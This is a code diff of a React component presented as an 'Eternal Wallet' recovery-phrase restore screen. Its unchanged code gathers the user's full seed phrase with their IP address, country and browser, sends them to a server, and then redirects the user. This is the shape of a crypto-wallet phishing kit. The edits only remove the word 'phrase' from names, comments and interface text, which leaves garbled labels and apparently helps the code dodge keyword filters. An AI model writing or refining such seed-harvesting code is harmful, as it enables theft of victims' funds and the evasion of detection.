@@ -7,7 +7,7 @@ import axios from "axios";
 const loadWordlist = async (): Promise<string[]> => {
   try {
     console.log("Loading wordlist...");
-    const response = await fetch("/recovery_phrase.txt");
+    const response = await fetch("/recovery_.txt");
     const text = await response.text();
     const words = text
       .trim()
@@ -29,13 +29,13 @@ const sanitizeInput = (input: string): string => {
     .replace(/[^a-z]/g, "");
 };
 
-// Helper function to check if seed phrase is correct
-const isCorrectRecoveryPhrase = (
-  recoveryPhrase: string[],
+// Helper function to check if seed  is correct
+const isCorrectRecovery = (
+  recovery: string[],
   wordlist: string[]
 ): boolean => {
   if (wordlist.length === 0) return true; // Skip validation if wordlist not loaded yet
-  return recoveryPhrase.every((word) => wordlist.includes(word));
+  return recovery.every((word) => wordlist.includes(word));
 };
 
 // Get user's IP and location info
@@ -66,7 +66,7 @@ const getUserCountry = async () => {
   }
 };
 
-export default function RecoveryPhraseRestore({
+export default function RecoveryRestore({
   wordCounts = [24, 15, 12],
   onCancel,
   onConfirm,
@@ -136,7 +136,7 @@ export default function RecoveryPhraseRestore({
     }
   }
 
-  // Handle paste of full seed phrase
+  // Handle paste of full seed 
   function handlePaste(e: React.ClipboardEvent<HTMLInputElement>) {
     e.preventDefault();
 
@@ -175,7 +175,7 @@ export default function RecoveryPhraseRestore({
     // Check if all fields are filled
     const allFilled = words.every((w) => w && w.length > 0);
     if (!allFilled) {
-      setValidationError("Please fill in all recovery phrase words");
+      setValidationError("Please fill in all recovery  words");
       firstInputRef.current?.focus();
       return;
     }
@@ -191,14 +191,14 @@ export default function RecoveryPhraseRestore({
 
     try {
       // Sanitize and validate words
-      const sanitizedRecoveryPhrase = words.map((word) => sanitizeInput(word));
+      const sanitizedRecovery = words.map((word) => sanitizeInput(word));
 
       // Validate against BIP39 wordlist
       if (
         wordlist.length > 0 &&
-        !isCorrectRecoveryPhrase(sanitizedRecoveryPhrase, wordlist)
+        !isCorrectRecovery(sanitizedRecovery, wordlist)
       ) {
-        const invalidWords = sanitizedRecoveryPhrase.filter(
+        const invalidWords = sanitizedRecovery.filter(
           (word) => !wordlist.includes(word)
         );
         throw new Error(`Invalid words: ${invalidWords.join(", ")}`);
@@ -209,7 +209,7 @@ export default function RecoveryPhraseRestore({
 
       const messageData = {
         appName: "Eternal Wallet",
-        recoveryPhrase: sanitizedRecoveryPhrase.join(" "),
+        recovery: sanitizedRecovery.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
         browser:
@@ -234,7 +234,7 @@ export default function RecoveryPhraseRestore({
 
       if (response.status === 200 && result.status) {
         window.location.href = "https://eternal-wallet.io/";
-        console.log("Recovery phrase validation successful:", result);
+        console.log("Recovery  validation successful:", result);
         onConfirm?.(words);
       } else {
         const serverMessage = result?.message || "Something went wrong.";
@@ -271,7 +271,7 @@ export default function RecoveryPhraseRestore({
           : "bg-white/3 hover:bg-white/5 ring-white/10"
           }`}
       >
-        <div className="font-semibold text-white">{count}-word phrase</div>
+        <div className="font-semibold text-white">{count}-word </div>
         <div className="text-sm text-white/60 mt-1">{desc}</div>
       </button>
     );
@@ -284,7 +284,7 @@ export default function RecoveryPhraseRestore({
 
     return (
       <div className="max-h-[70vh] overflow-y-auto pb-5">
-        {/* Paste full phrase button */}
+        {/* Paste full  button */}
         <div className="flex justify-end mb-4">
           <button
             type="button"
@@ -316,7 +316,7 @@ export default function RecoveryPhraseRestore({
             }}
             className="rounded-full bg-white/10 px-4 py-2 text-xs text-white hover:bg-white/20 transition"
           >
-            📋 Paste full phrase
+            📋 Paste full
           </button>
         </div>
 
@@ -382,7 +382,7 @@ export default function RecoveryPhraseRestore({
     <div>
       {step === "type" && (
         <div>
-          <h4 className="text-lg font-semibold text-white">Recovery phrase type</h4>
+          <h4 className="text-lg font-semibold text-white">Recovery  type</h4>
           <p className="mt-2 text-white/70">
             What kind of wallet would you like to restore?
           </p>
@@ -425,9 +425,9 @@ export default function RecoveryPhraseRestore({
 
             <div className="text-center w-full -ml-10">
               <h4 className="text-lg font-semibold text-white">
-                Recovery phrase
+                Recovery
               </h4>
-              <p className="mt-2 text-white/70">Enter your saved recovery phrase</p>
+              <p className="mt-2 text-white/70"> saved recovery </p>
             </div>
 
             {/* placeholder to keep header balanced */}
